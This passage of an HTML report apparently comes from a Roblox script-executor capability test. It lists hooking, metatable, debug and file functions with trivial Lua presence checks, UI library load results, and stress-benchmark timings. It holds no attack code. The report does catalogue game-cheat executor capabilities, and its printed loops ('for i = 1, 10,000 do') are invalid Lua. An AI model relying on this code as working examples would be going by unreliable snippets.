+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if gethiddenproperty then
+    print("gethiddenproperty is available")
+else
+    print("gethiddenproperty is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getinfo</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p135',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p135'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getinfo
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getinfo then
+    print("getinfo is available")
+else
+    print("getinfo is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getinstances</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p136',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p136'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getinstances
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getinstances then
+    print("getinstances is available")
+else
+    print("getinstances is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getloadedmodules</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p137',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p137'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getloadedmodules
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getloadedmodules then
+    print("getloadedmodules is available")
+else
+    print("getloadedmodules is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getnamecallmethod</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p138',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p138'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getnamecallmethod
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getnamecallmethod then
+    print("getnamecallmethod is available")
+else
+    print("getnamecallmethod is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getnilinstances</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p139',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p139'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getnilinstances
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getnilinstances then
+    print("getnilinstances is available")
+else
+    print("getnilinstances is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getproto</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p140',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p140'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getproto
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getproto then
+    print("getproto is available")
+else
+    print("getproto is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getprotos</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p141',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p141'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getprotos
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getprotos then
+    print("getprotos is available")
+else
+    print("getprotos is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getrawmetatable</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p142',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p142'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getrawmetatable
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getrawmetatable then
+    print("getrawmetatable is available")
+else
+    print("getrawmetatable is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getreg</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p143',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p143'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getreg
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getreg then
+    print("getreg is available")
+else
+    print("getreg is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getscripts</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p144',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p144'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getscripts
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getscripts then
+    print("getscripts is available")
+else
+    print("getscripts is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getsenv</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p145',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p145'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getsenv
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getsenv then
+    print("getsenv is available")
+else
+    print("getsenv is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getstack</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p146',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p146'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getstack
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getstack then
+    print("getstack is available")
+else
+    print("getstack is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getupvalue</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p147',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p147'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getupvalue
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getupvalue then
+    print("getupvalue is available")
+else
+    print("getupvalue is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getupvalues</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p148',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p148'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getupvalues
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getupvalues then
+    print("getupvalues is available")
+else
+    print("getupvalues is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>hookfunction</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p149',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p149'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: hookfunction
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if hookfunction then
+    print("hookfunction is available")
+else
+    print("hookfunction is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>islclosure</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p150',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p150'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: islclosure
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if islclosure then
+    print("islclosure is available")
+else
+    print("islclosure is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>isreadonly</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p151',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p151'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: isreadonly
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if isreadonly then
+    print("isreadonly is available")
+else
+    print("isreadonly is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>listfiles</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p152',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p152'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: listfiles
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if listfiles then
+    print("listfiles is available")
+else
+    print("listfiles is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>loadfile</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p153',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p153'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: loadfile
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if loadfile then
+    print("loadfile is available")
+else
+    print("loadfile is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>loadstring</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p154',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p154'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: loadstring
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if loadstring then
+    print("loadstring is available")
+else
+    print("loadstring is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>makefolder</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p155',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p155'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: makefolder
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if makefolder then
+    print("makefolder is available")
+else
+    print("makefolder is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>newcclosure</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p156',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p156'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: newcclosure
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if newcclosure then
+    print("newcclosure is available")
+else
+    print("newcclosure is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>readfile</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p157',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p157'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: readfile
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if readfile then
+    print("readfile is available")
+else
+    print("readfile is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>replaceclosure</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p158',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p158'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: replaceclosure
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if replaceclosure then
+    print("replaceclosure is available")
+else
+    print("replaceclosure is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>request</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p159',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p159'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: request
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if request then
+    print("request is available")
+else
+    print("request is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>setconstant</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p160',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p160'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: setconstant
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if setconstant then
+    print("setconstant is available")
+else
+    print("setconstant is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>setfflag</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p161',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p161'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: setfflag
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if setfflag then
+    print("setfflag is available")
+else
+    print("setfflag is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>sethiddenproperty</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p162',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p162'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: sethiddenproperty
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if sethiddenproperty then
+    print("sethiddenproperty is available")
+else
+    print("sethiddenproperty is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>setmetatable</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p163',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p163'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: setmetatable
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if setmetatable then
+    print("setmetatable is available")
+else
+    print("setmetatable is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>setnamecallmethod</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p164',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p164'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: setnamecallmethod
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if setnamecallmethod then
+    print("setnamecallmethod is available")
+else
+    print("setnamecallmethod is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>setreadonly</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p165',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p165'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: setreadonly
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if setreadonly then
+    print("setreadonly is available")
+else
+    print("setreadonly is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>setstack</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p166',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p166'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: setstack
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if setstack then
+    print("setstack is available")
+else
+    print("setstack is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>setupvalue</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p167',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p167'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: setupvalue
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if setupvalue then
+    print("setupvalue is available")
+else
+    print("setupvalue is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>writefile</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p168',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p168'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: writefile
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if writefile then
+    print("writefile is available")
+else
+    print("writefile is NOT available")
+end</pre></td></tr></tbody></table></div></section>
+
+<section class="sec" id="ui">
+  <div class="sh">
+    <div class="sh-title">UI LIBRARIES</div>
+    <div class="sh-meta">13 TESTED · 11 LOADED · 2 FAILED</div>
+  </div>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr>
+        <th class="th-accent"></th>
+        <th>LIBRARY</th>
+        <th>STATUS</th>
+        <th></th>
+      </tr></thead>
+      <tbody><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>OrionLib</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p169',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p169'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: OrionLib
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Rayfield</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p170',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p170'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: Rayfield
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>SiriusLib</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p171',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p171'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: SiriusLib
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>WallyV3</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p172',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p172'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: WallyV3
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-fail'><td class='td-accent accent-fail'></td><td class='td-name'>ReGui</td><td><span class='tag tag-fail'>FAILED</span></td><td><button class='vbtn vbtn-fail' onclick="toggle('p173',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p173'><td colspan='4' class='det-cell accent-fail'><pre class='det-pre'>-- Library: ReGui
+-- Status:  LOAD FAILED
+-- Possible causes:
+--   1. HTTP fetch failed (executor blocked outbound requests)
+--   2. loadstring() returned nil (syntax/parse error)
+--   3. Library execution threw a runtime error
+--   4. The URL returned 404 / empty response
+
+-- Error detail: ReGui - Timeout</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Bracket</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p174',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p174'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: Bracket
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Obsidian</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p175',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p175'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: Obsidian
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>LinoriaLib</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p176',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p176'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: LinoriaLib
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Darius (Wax)</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p177',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p177'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: Darius (Wax)
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Darius (Min)</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p178',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p178'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: Darius (Min)
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Darius (RBXM)</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p179',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p179'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: Darius (RBXM)
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Linoria (wis-h)</td><td><span class='tag tag-pass'>LOADED</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p180',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p180'><td colspan='4' class='det-cell accent-pass'><pre class='det-pre'>-- Library: Linoria (wis-h)
+-- Status:  LOADED SUCCESSFULLY
+-- The library was fetched, parsed, and executed without error.
+-- It is injected into the executor environment and ready to use.</pre></td></tr><tr class='row row-fail'><td class='td-accent accent-fail'></td><td class='td-name'>Monolith</td><td><span class='tag tag-fail'>FAILED</span></td><td><button class='vbtn vbtn-fail' onclick="toggle('p181',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p181'><td colspan='4' class='det-cell accent-fail'><pre class='det-pre'>-- Library: Monolith
+-- Status:  LOAD FAILED
+-- Possible causes:
+--   1. HTTP fetch failed (executor blocked outbound requests)
+--   2. loadstring() returned nil (syntax/parse error)
+--   3. Library execution threw a runtime error
+--   4. The URL returned 404 / empty response
+
+-- Error detail: Monolith - Execution failed: :63: attempt to index nil with 'Register'</pre></td></tr></tbody>
+    </table>
+  </div>
+</section>
+
+<section class="sec" id="stress">
+  <div class="sh">
+    <div class="sh-title">STRESS TEST</div>
+    <div class="sh-meta">6 STAGES · 6 PASSED</div>
+  </div>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr>
+        <th class="th-accent"></th>
+        <th>STAGE</th>
+        <th>ITERATIONS</th>
+        <th>TIME</th>
+        <th>SPEED</th>
+        <th>STATUS</th>
+        <th></th>
+      </tr></thead>
+      <tbody><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Very Light</td><td>10,000</td><td>0.002s</td><td class='td-ips'><span class='ips-val'>5,133,787/s</span><div class='ips-track'><div class='ips-fill' style='width:93%'></div></div></td><td><span class='tag tag-pass'>PASS</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p182',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p182'><td colspan='7' class='det-cell accent-pass'><pre class='det-pre'>-- Stage: Very Light
+-- Status: PASS
+-- Iterations: 10,000
+-- Time: 0.002s
+-- Speed: 5,133,787 iterations/second
+
+-- Benchmark core:
+local sum = 0
+for i = 1, 10,000 do
+    local r = math.rad(i)
+    sum = sum + math.sin(r) * math.cos(r) - (math.sin(r) / math.cos(r + 1e-10))
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Light</td><td>100,000</td><td>0.023s</td><td class='td-ips'><span class='ips-val'>4,256,232/s</span><div class='ips-track'><div class='ips-fill' style='width:77%'></div></div></td><td><span class='tag tag-pass'>PASS</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p183',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p183'><td colspan='7' class='det-cell accent-pass'><pre class='det-pre'>-- Stage: Light
+-- Status: PASS
+-- Iterations: 100,000
+-- Time: 0.023s
+-- Speed: 4,256,232 iterations/second
+
+-- Benchmark core:
+local sum = 0
+for i = 1, 100,000 do
+    local r = math.rad(i)
+    sum = sum + math.sin(r) * math.cos(r) - (math.sin(r) / math.cos(r + 1e-10))
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Medium</td><td>500,000</td><td>0.091s</td><td class='td-ips'><span class='ips-val'>5,513,351/s</span><div class='ips-track'><div class='ips-fill' style='width:100%'></div></div></td><td><span class='tag tag-pass'>PASS</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p184',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p184'><td colspan='7' class='det-cell accent-pass'><pre class='det-pre'>-- Stage: Medium
+-- Status: PASS
+-- Iterations: 500,000
